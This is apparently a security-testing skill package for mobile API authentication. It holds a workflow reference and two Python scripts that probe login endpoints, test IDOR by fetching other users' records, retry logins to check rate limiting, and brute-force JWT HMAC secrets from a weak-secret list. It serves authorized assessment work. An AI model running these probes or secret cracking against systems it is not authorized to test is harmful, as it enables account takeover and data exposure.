| CWE-798 | Hardcoded Credentials | API key in APK/IPA |
| CWE-613 | Insufficient Session Expiration | Token lifetime testing |
| CWE-384 | Session Fixation | Pre-auth token reuse |

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/references/workflows.md =====
# Workflows: Mobile API Authentication Testing

## Workflow 1: Authentication Assessment

```
[Intercept traffic] --> [Map auth endpoints] --> [Analyze token format]
                                                        |
                                          +-------------+-------------+
                                          |             |             |
                                    [JWT analysis] [OAuth flow]  [Session mgmt]
                                    [None alg]     [PKCE check]  [Expiration]
                                    [Key brute]    [Redirect URI] [Logout invalidation]
                                          |             |             |
                                          +-------------+-------------+
                                                        |
                                                 [IDOR testing]
                                                 [Privilege escalation]
                                                 [Report findings]
```

## Decision Matrix: Token Vulnerability Testing

| Token Type | Primary Tests | Tools |
|-----------|--------------|-------|
| JWT (HS256) | Key brute force, none algorithm, claim manipulation | jwt_tool, hashcat |
| JWT (RS256) | Algorithm confusion, public key retrieval, key ID manipulation | jwt_tool |
| Opaque | Entropy analysis, predictability, server-side invalidation | Burp Sequencer |
| OAuth Bearer | Scope escalation, redirect URI manipulation, PKCE enforcement | Burp, Postman |

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for testing mobile API authentication security.

Tests mobile app backend APIs for broken authentication, insecure
token management, session fixation, privilege escalation, and
IDOR vulnerabilities using intercepted traffic analysis.
"""

import json
import base64
import hashlib
import hmac
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


AUTH_ENDPOINTS = [
    "/api/v1/login", "/api/v1/register", "/api/v1/token",
    "/api/v1/refresh", "/api/v1/logout", "/api/v1/forgot-password",
    "/api/v1/reset-password", "/api/v1/verify-otp", "/api/v1/me",
    "/api/v2/auth/login", "/auth/token", "/oauth/token",
]

WEAK_SECRETS = [
    "secret", "password", "123456", "mobile_secret", "app_secret",
    "changeme", "default", "your-256-bit-secret", "s3cr3t",
]


class MobileAPIAuthAgent:
    """Tests mobile API authentication mechanisms."""

    def __init__(self, base_url, output_dir="./mobile_api_auth_test"):
        self.base_url = base_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _req(self, method, path, **kwargs):
        if not requests:
            return None
        kwargs.setdefault("timeout", 10)
        try:
            return requests.request(method, f"{self.base_url}{path}", **kwargs)
        except requests.RequestException:
            return None

    def discover_auth_endpoints(self):
        """Probe common mobile auth endpoints."""
        found = []
        for ep in AUTH_ENDPOINTS:
            resp = self._req("OPTIONS", ep)
            if resp and resp.status_code != 404:
                found.append({"endpoint": ep, "status": resp.status_code,
                              "methods": resp.headers.get("Allow", "")})
        return found

    def test_no_auth_access(self, endpoints=None):
        """Test endpoints without authentication token."""
        targets = endpoints or ["/api/v1/me", "/api/v1/users", "/api/v1/orders",
                                "/api/v1/settings", "/api/v1/notifications"]
        results = []
        for ep in targets:
            resp = self._req("GET", ep)
            if resp and resp.status_code == 200:
                results.append({"endpoint": ep, "status": 200, "body_len": len(resp.text)})
                self.findings.append({"severity": "critical", "type": "No Auth Required",
                                      "detail": f"{ep} accessible without token"})
        return results

    def decode_jwt(self, token):
        parts = token.split(".")
        if len(parts) != 3:
            return None, None
        def pad(s): return s + "=" * (4 - len(s) % 4)
        try:
            header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
            payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            return header, payload
        except Exception:
            return None, None

    def analyze_token(self, token):
        """Analyze JWT for mobile-specific weaknesses."""
        header, payload = self.decode_jwt(token)
        if not header:
            return {"error": "Invalid token"}
        issues = []
        if header.get("alg") == "none":
            issues.append({"severity": "critical", "issue": "alg:none - no signature"})
        if "exp" not in payload:
            issues.append({"severity": "high", "issue": "No expiration - token lives forever"})
        if "device_id" not in payload and "did" not in payload:
            issues.append({"severity": "medium", "issue": "No device binding in token"})
        if header.get("alg", "").startswith("HS"):
            issues.append({"severity": "info", "issue": "Symmetric HMAC - test weak secrets"})
        for i in issues:
            self.findings.append({"severity": i["severity"], "type": "Token Analysis", "detail": i["issue"]})
        return {"header": header, "payload": payload, "issues": issues}

    def test_token_reuse_after_logout(self, token, logout_path="/api/v1/logout"):
        """Test if token remains valid after logout."""
        headers = {"Authorization": f"Bearer {token}"}
        self._req("POST", logout_path, headers=headers)
        resp = self._req("GET", "/api/v1/me", headers=headers)
        if resp and resp.status_code == 200:
            self.findings.append({"severity": "high", "type": "Token Reuse After Logout",
                                  "detail": "Token still valid after logout call"})
            return {"reusable": True}
        return {"reusable": False}

    def test_rate_limiting(self, login_path="/api/v1/login", attempts=20):
        """Test brute-force protection on login endpoint."""
        blocked = False
        for i in range(attempts):
            resp = self._req("POST", login_path, json={"username": "test", "password": f"wrong{i}"})
            if resp and resp.status_code == 429:
                blocked = True
                break
        if not blocked:
            self.findings.append({"severity": "high", "type": "No Rate Limiting",
                                  "detail": f"Login accepted {attempts} attempts without blocking"})
        return {"rate_limited": blocked, "attempts": attempts}

    def test_idor(self, token, resource_path="/api/v1/users/{id}", own_id="1", other_id="2"):
        """Test for IDOR by accessing another user's resource."""
        headers = {"Authorization": f"Bearer {token}"}
        own = self._req("GET", resource_path.format(id=own_id), headers=headers)
        other = self._req("GET", resource_path.format(id=other_id), headers=headers)
        if own and other and other.status_code == 200:
            self.findings.append({"severity": "critical", "type": "IDOR",
                                  "detail": f"User {own_id} can access user {other_id} data"})
            return {"vulnerable": True}
        return {"vulnerable": False}

    def brute_force_jwt_secret(self, token):
        """Test for weak HMAC signing secrets."""
        header, _ = self.decode_jwt(token)
        if not header or header.get("alg") not in ("HS256", "HS384", "HS512"):
            return None
        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        h = alg_map[header["alg"]]
        for secret in WEAK_SECRETS:
            expected = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, h).digest()
            ).decode().rstrip("=")
            if expected == parts[2]:
                self.findings.append({"severity": "critical", "type": "Weak JWT Secret",
                                      "detail": f"Secret cracked: '{secret}'"})
                return secret
        return None

    def generate_report(self, token=None):
        endpoints = self.discover_auth_endpoints()
        no_auth = self.test_no_auth_access()
        token_analysis = self.analyze_token(token) if token else None
        secret = self.brute_force_jwt_secret(token) if token else None

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "target": self.base_url,
            "auth_endpoints": endpoints,
            "unauthenticated_access": no_auth,
            "token_analysis": token_analysis,
            "weak_secret": secret,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "mobile_api_auth_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <base_url> [--token <jwt>]")
        sys.exit(1)
    url = sys.argv[1]
    token = None
    if "--token" in sys.argv:
        token = sys.argv[sys.argv.index("--token") + 1]
    agent = MobileAPIAuthAgent(url)
    agent.generate_report(token)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/scripts/process.py =====
#!/usr/bin/env python3
"""
Mobile API Authentication Tester

Tests common authentication vulnerabilities in mobile API endpoints including
JWT analysis, IDOR detection, and session management assessment.

Usage:
    python process.py --base-url https://api.target.com --token <JWT> [--output report.json]
"""

import argparse
import base64
import json
import os
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("ERROR: 'requests' required. Install: pip install requests")
    sys.exit(1)


class MobileAPIAuthTester:
    """Tests mobile API authentication and authorization."""

    def __init__(self, base_url: str, token: str):
        self.base_url = base_url.rstrip("/")
        self.token = token
        self.findings = []
        self.session = requests.Session()
        self.session.verify = not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true"  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
        self.session.headers.update({
            "Authorization": f"Bearer {token}",
            "User-Agent": "MobileSecurityTester/1.0",
        })

    def analyze_jwt(self) -> dict:
        """Analyze JWT token structure and identify vulnerabilities."""
        parts = self.token.split(".")
        if len(parts) != 3:
            return {"is_jwt": False, "format": "opaque_or_invalid"}

        try:
            # Decode header
            header_padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))

            # Decode payload
            payload_padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            issues = []

            # Check algorithm
            alg = header.get("alg", "unknown")
            if alg.lower() == "none":
                issues.append({"issue": "none_algorithm", "severity": "CRITICAL"})
            elif alg.lower() in ("hs256", "hs384", "hs512"):
                issues.append({"issue": "hmac_algorithm_key_brute_forceable", "severity": "MEDIUM"})

            # Check expiration
            exp = payload.get("exp")
            if not exp:
                issues.append({"issue": "no_expiration_claim", "severity": "HIGH"})
            elif exp < time.time():
                issues.append({"issue": "token_already_expired", "severity": "INFO"})
            elif exp - time.time() > 86400 * 7:
                issues.append({"issue": "excessive_token_lifetime", "severity": "MEDIUM",
                               "details": f"Expires in {(exp - time.time()) / 86400:.0f} days"})

            # Check for sensitive data in payload
            sensitive_keys = ["password", "secret", "ssn", "credit_card"]
            for key in payload:
                if any(s in key.lower() for s in sensitive_keys):
                    issues.append({"issue": f"sensitive_data_in_jwt: {key}", "severity": "HIGH"})

            # Check missing claims
            if "iss" not in payload:
                issues.append({"issue": "missing_issuer_claim", "severity": "LOW"})
            if "iat" not in payload:
                issues.append({"issue": "missing_issued_at_claim", "severity": "LOW"})

            finding = {
                "check": "jwt_analysis",
                "is_jwt": True,
                "algorithm": alg,
                "claims": list(payload.keys()),
                "issues": issues,
                "severity": "HIGH" if any(i["severity"] in ("CRITICAL", "HIGH") for i in issues) else "MEDIUM",
            }
            self.findings.append(finding)
            return finding

        except Exception as e:
            return {"is_jwt": True, "error": str(e)}

    def test_missing_auth(self, endpoints: list) -> list:
        """Test endpoints without authentication."""
        results = []
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                resp = requests.get(url, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true", timeout=10,  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
                                    headers={"User-Agent": "MobileSecurityTester/1.0"})
                if resp.status_code != 401 and resp.status_code != 403:
                    result = {
                        "endpoint": endpoint,
                        "status": resp.status_code,
                        "issue": "accessible_without_auth",
                        "severity": "CRITICAL",
                    }
                    results.append(result)
            except requests.RequestException:
                pass
            time.sleep(0.5)  # Rate limiting

        if results:
            self.findings.append({
                "check": "missing_authentication",
                "owasp_api": "API2",
                "endpoints_tested": len(endpoints),
                "unprotected": len(results),
                "details": results,
                "severity": "CRITICAL",
            })
        return results

    def test_expired_token(self) -> dict:
        """Test if expired tokens are accepted."""
        # Create a JWT with expired timestamp (modifying payload)
        parts = self.token.split(".")
        if len(parts) != 3:
            return {"check": "expired_token", "skipped": True}

        try:
            payload_padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            if "exp" in payload and payload["exp"] < time.time():
                # Token is already expired, test if it still works
                resp = self.session.get(f"{self.base_url}/api/v1/users/me", timeout=10)
                accepted = resp.status_code == 200

                finding = {
                    "check": "expired_token_acceptance",
                    "token_expired": True,
                    "still_accepted": accepted,
                    "severity": "CRITICAL" if accepted else "PASS",
                }
                self.findings.append(finding)
                return finding
        except Exception:
            pass

        return {"check": "expired_token", "skipped": True, "reason": "token_not_expired"}

    def test_idor(self, endpoint_template: str, valid_id: str, other_ids: list) -> list:
        """Test for IDOR by substituting object IDs."""
        results = []
        for other_id in other_ids:
            url = f"{self.base_url}{endpoint_template.replace('{id}', other_id)}"
            try:
                resp = self.session.get(url, timeout=10)
                if resp.status_code == 200:
                    results.append({
                        "endpoint": url,
                        "original_id": valid_id,
                        "tested_id": other_id,
                        "accessible": True,
                        "severity": "CRITICAL",
                    })
            except requests.RequestException:
                pass
            time.sleep(0.5)

        if results:
            self.findings.append({
                "check": "idor",
                "owasp_api": "API1",
                "vulnerable_endpoints": len(results),
                "details": results,
                "severity": "CRITICAL",
            })
        return results

    def generate_report(self) -> dict:
        """Generate authentication test report."""
        severity_counts = {}
        for f in self.findings:
            sev = f.get("severity", "INFO")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        return {
            "assessment": {
                "target": self.base_url,
                "type": "Mobile API Authentication Testing",
                "date": datetime.now().isoformat(),
            },
            "summary": {
                "total_checks": len(self.findings),
                "severity_breakdown": severity_counts,
            },
            "findings": self.findings,
        }


def main():
    parser = argparse.ArgumentParser(description="Mobile API Authentication Tester")
    parser.add_argument("--base-url", required=True, help="API base URL")
    parser.add_argument("--token", required=True, help="Bearer token (JWT or opaque)")
    parser.add_argument("--output", default="auth_test.json", help="Output report")
    parser.add_argument("--endpoints", nargs="*", default=[
        "/api/v1/users/me", "/api/v1/users", "/api/v1/admin",
    ], help="Endpoints to test")
    args = parser.parse_args()

    tester = MobileAPIAuthTester(args.base_url, args.token)

    print("[*] Analyzing token...")
    tester.analyze_jwt()

    print("[*] Testing missing authentication...")
    tester.test_missing_auth(args.endpoints)

    print("[*] Testing expired token acceptance...")
    tester.test_expired_token()

    report = tester.generate_report()
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    print(f"[+] Report saved: {args.output}")
    print(f"[*] Findings: {report['summary']['severity_breakdown']}")


if __name__ == "__main__":
    main()

===== END FILE =====
